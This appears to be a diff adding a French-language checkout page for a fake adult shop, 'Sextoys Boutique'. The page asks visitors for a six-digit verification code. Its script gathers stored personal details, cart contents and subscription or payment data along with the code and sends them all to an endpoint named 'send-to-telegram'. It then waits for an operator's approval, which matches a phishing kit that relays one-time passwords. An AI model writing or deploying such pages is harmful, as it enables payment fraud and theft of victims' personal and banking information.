@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sextoys Boutique - Vérification du code</title>
+    <style>
+        body {
+            background-color: #0f1419;
+            color: #e6e6e6;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #1a2329;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            width: 100%;
+        }
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+        .logo-container h1 {
+            margin: 0 0 0 10px;
+            color: #f28c38;
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        .logo-container span {
+            font-size: 14px;
+            color: #b0b0b0;
+            display: block;
+            margin-top: -5px;
+        }
+        .container {
+            background-color: #1f2a33;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+            margin: 40px 0;
+            text-align: center;
+        }
+        .progress-bar {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .progress-bar div {
+            width: 20px;
+            height: 20px;
+            background-color: #2a3640;
+            border-radius: 50%;
+            margin: 0 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            color: #e6e6e6;
+        }
+        .progress-bar .active {
+            background-color: #f28c38;
+        }
+        h2 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #f28c38;
+        }
+        p {
+            font-size: 14px;
+            color: #b0b0b0;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #b0b0b0;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+            background-color: #fff;
+            color: #333;
+        }
+        .input-group .error {
+            color: #ff4d4d;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #f28c38;
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+        button:hover {
+            background-color: #d97706;
+            transform: scale(1.03);
+        }
+        #loading-message {
+            display: none;
+            text-align: center;
+            color: #f28c38;
+            font-size: 16px;
+            margin-top: 20px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <h1>Sextoys Boutique</h1>
+            <span>Plaisir & Élégance</span>
+        </div>
+    </header>
+    <div class="container">
+        <div class="progress-bar">
+            <div>1</div>
+            <div>2</div>
+            <div>3</div>
+            <div class="active">4</div>
+            <div>5</div>
+        </div>
+        <h2>Vérification du Code</h2>
+        <p>Un code de vérification a été envoyé à votre numéro de téléphone ou à votre adresse e-mail. Veuillez entrer le code ci-dessous.</p>
+        
+        <div class="input-group">
+            <label for="verification-code">Entrez le code de vérification</label>
+            <input type="text" id="verification-code" name="verification-code" placeholder="123456" maxlength="6" required>
+            <div id="code-error" class="error">Le code doit contenir exactement 6 chiffres.</div>
+        </div>
+
+        <form id="verification-form">
+            <button type="submit">Valider</button>
+        </form>
+        <div id="loading-message">Veuillez patienter, chargement en cours...</div>
+    </div>
+    <script>
+        // Récupérer les données de subscriptionData
+        const subscriptionData = JSON.parse(localStorage.getItem('subscriptionData'));
+        if (!subscriptionData) {
+            console.error('subscriptionData non trouvé dans localStorage');
+        }
+
+        document.getElementById('verification-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            console.log('Formulaire de vérification soumis');
+
+            // Récupérer le code entré
+            const verificationCode = document.getElementById('verification-code').value.trim();
+
+            // Réinitialiser les messages d'erreur
+            document.getElementById('code-error').style.display = 'none';
+            let hasError = false;
+
+            // Validation : Code de vérification (6 chiffres)
+            if (!/^\d{6}$/.test(verificationCode)) {
+                document.getElementById('code-error').style.display = 'block';
+                hasError = true;
+            }
+
+            // Si une erreur est détectée, arrêter ici
+            if (hasError) {
+                return;
+            }
+
+            // Préparer les données à envoyer à Telegram
+            const personalInfo = JSON.parse(localStorage.getItem('personalInfo'));
+            const cart = JSON.parse(localStorage.getItem('cart'));
+            const data = {
+                cart,
+                personalInfo,
+                subscriptionData,
+                verificationCode
+            };
+            console.log('Données à envoyer :', data);
+
+            // Afficher le message de chargement
+            const loadingMessage = document.getElementById('loading-message');
+            loadingMessage.style.display = 'block';
+
+            try {
+                console.log('Envoi au serveur...');
+                const response = await fetch('api/send-to-telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                console.log('Réponse serveur :', response);
+                const result = await response.json();
+                console.log('Résultat :', result);
+
+                // Cacher le message de chargement
+                loadingMessage.style.display = 'none';
+
+                if (result.approved) {
+                    window.location.href = 'confirmation.html';
+                } else {
+                    alert('Code de vérification incorrect. Veuillez réessayer.');
+                    setTimeout(() => window.location.reload(), 5000);
+                }
+            } catch (error) {
+                console.error('Erreur :', error);
+                loadingMessage.style.display = 'none';
+                alert('Erreur de connexion au serveur. Réessayez plus tard.');
+            }
+        });
+    </script>
+</body>
+</html>
